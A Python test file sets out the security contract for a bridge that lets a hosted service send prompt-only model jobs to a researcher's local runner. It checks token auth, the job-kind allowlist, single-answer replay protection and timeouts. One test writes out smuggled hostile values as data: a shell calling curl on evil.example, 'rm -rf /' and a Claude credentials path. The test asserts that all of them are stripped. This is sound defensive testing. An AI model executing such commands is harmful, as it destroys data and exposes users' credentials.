"""Local-runner bridge: the hosted service may ask the researcher's machine to
run a model job, and nothing more. These tests are the security contract:

* a job carries prompts only — never a command, path, flag or executable;
* the runner endpoints need the runner token, never the internal API key;
* only the runner that claimed a job can answer it, and only once;
* a dead runner's job returns to the queue (idempotent retry);
* with no runner connected, model-dependent code says so instead of hanging;
* no Claude credential or session material is requested, sent or logged.
"""
from __future__ import annotations

import time

import pytest
from app.experimental import relay_client, runner
from app.main import app
from fastapi.testclient import TestClient

TOKEN = "runner-token-for-tests"
AUTH = {"Authorization": f"Bearer {TOKEN}"}


@pytest.fixture
def client(monkeypatch):
    monkeypatch.setenv("HIVEBLOT_RUNNER_TOKEN", TOKEN)
    runner.JOBS.clear()
    monkeypatch.setattr(runner, "_LAST_POLL", 0.0, raising=False)
    with TestClient(app) as c:
        yield c
    runner.JOBS.clear()


def test_runner_endpoints_require_the_runner_token(client, monkeypatch):
    from app.config import settings
    assert client.get("/experimental/runner/jobs?wait=0").status_code == 401
    assert client.get("/experimental/runner/jobs?wait=0", headers={"Authorization": "Bearer nope"}).status_code == 401
    # the internal API key is NOT a runner token: a leaked runner token must not read the corpus either
    assert client.get("/experimental/runner/jobs?wait=0",
                      headers={"Authorization": f"Bearer {settings.internal_api_key}"}).status_code == 401
    assert client.get("/experimental/runner/jobs?wait=0", headers=AUTH).status_code == 200
    # and the corpus routes do not accept the runner token
    assert client.post("/experimental/search", json={"query": "GAPDH"}, headers=AUTH).status_code in (401, 403)


def test_bridge_is_inert_without_a_configured_token(client, monkeypatch):
    monkeypatch.delenv("HIVEBLOT_RUNNER_TOKEN", raising=False)
    assert client.get("/experimental/runner/jobs?wait=0", headers=AUTH).status_code == 503
    ok, why = relay_client._status("relay")
    assert not ok and "HIVEBLOT_RUNNER_TOKEN" in why


def test_a_job_can_only_carry_prompts(client):
    job = runner.submit("paper_qa", {
        "system": "SYS", "user": "USER", "max_tokens": 50,
        # everything below is what an attacker would want to smuggle through
        "executable": "/bin/sh", "args": ["-c", "curl evil.example"], "cwd": "/",
        "env": {"ANTHROPIC_API_KEY": "x"}, "claude_session": "~/.claude/.credentials.json",
        "command": "rm -rf /", "allowedTools": "Bash",
    })
    assert set(job.payload) == {"system", "user", "max_tokens", "image_data_url", "json", "schema"}
    body = client.get("/experimental/runner/jobs?wait=0", headers=AUTH).json()["job"]
    assert set(body) == {"id", "kind", "job_token", "system", "user", "max_tokens", "image_data_url", "json", "schema"}
    assert "/bin/sh" not in str(body) and "rm -rf" not in str(body) and "credentials" not in str(body)
    with pytest.raises(ValueError):
        runner.submit("shell", {"system": "", "user": ""})          # kind allowlist
    with pytest.raises(ValueError):
        runner.submit("paper_qa", {"system": "x" * 200_001, "user": "y"})   # size bound


def test_only_the_claiming_runner_answers_and_only_once(client):
    job = runner.submit("paper_qa", {"system": "s", "user": "u"})
    claimed = client.get("/experimental/runner/jobs?wait=0", headers=AUTH).json()["job"]
    assert claimed["id"] == job.id
    # a second runner polling gets nothing: the job is in flight
    assert client.get("/experimental/runner/jobs?wait=0", headers=AUTH).json()["job"] is None
    bad = client.post(f"/experimental/runner/jobs/{job.id}/result", headers=AUTH,
                      json={"job_token": "forged", "result": {"text": "x"}})
    assert bad.status_code == 403 and job.result is None
    ok = client.post(f"/experimental/runner/jobs/{job.id}/result", headers=AUTH,
                     json={"job_token": claimed["job_token"], "result": {"text": "answer", "model": "sonnet"}})
    assert ok.status_code == 200 and ok.json()["accepted"] is True
    again = client.post(f"/experimental/runner/jobs/{job.id}/result", headers=AUTH,
                        json={"job_token": claimed["job_token"], "result": {"text": "overwrite"}})
    assert again.json()["accepted"] is False                      # replay cannot overwrite an answer
    assert runner.wait_for_result(job, 1)["text"] == "answer"
    assert client.post(f"/experimental/runner/jobs/does-not-exist/result", headers=AUTH,
                       json={"job_token": "x", "result": {}}).status_code == 404


def test_a_dead_runner_returns_its_job_to_the_queue(client, monkeypatch):
    job = runner.submit("paper_qa", {"system": "s", "user": "u"})
    client.get("/experimental/runner/jobs?wait=0", headers=AUTH)
    assert job.state == "claimed"
    monkeypatch.setattr(runner, "CLAIM_TIMEOUT_S", 0.0)
    again = client.get("/experimental/runner/jobs?wait=0", headers=AUTH).json()["job"]
    assert again["id"] == job.id and again["job_token"] != ""      # requeued and re-claimable


def test_without_a_runner_model_work_says_so_instead_of_hanging(client, monkeypatch):
    monkeypatch.setattr(runner, "_LAST_POLL", 0.0, raising=False)
    assert not runner.runner_online()
    ok, why = relay_client._status("relay")
    assert not ok and "Local Runner" in why
    with pytest.raises(RuntimeError) as e:
        relay_client.RelayLLMClient(timeout=1).complete_text("s", "u")
    assert "Local Runner" in str(e.value) and "densitometry" in str(e.value)
    # deterministic surfaces keep working with no runner
    assert client.get("/experimental/runner/status", headers=AUTH).json()["online"] is False


def test_relay_waits_for_the_local_answer_and_times_out_cleanly(client, monkeypatch):
    monkeypatch.setattr(runner, "_LAST_POLL", time.time(), raising=False)
    with pytest.raises(TimeoutError):
        relay_client.RelayLLMClient(timeout=0.2).complete_text("s", "u")
    assert all(j.state != "queued" for j in runner.JOBS.values())   # the abandoned job is dropped


def test_the_runner_script_refuses_unknown_job_kinds():
    import importlib.util
    spec = importlib.util.spec_from_file_location("hiveblot_runner", "/Users/niks/hive/scripts/hiveblot_runner.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    assert mod.HANDLERS == ("extract_panel", "paper_qa")
    with pytest.raises(ValueError):
        mod.run_job({"kind": "shell", "system": "", "user": "", "command": "id"}, None)
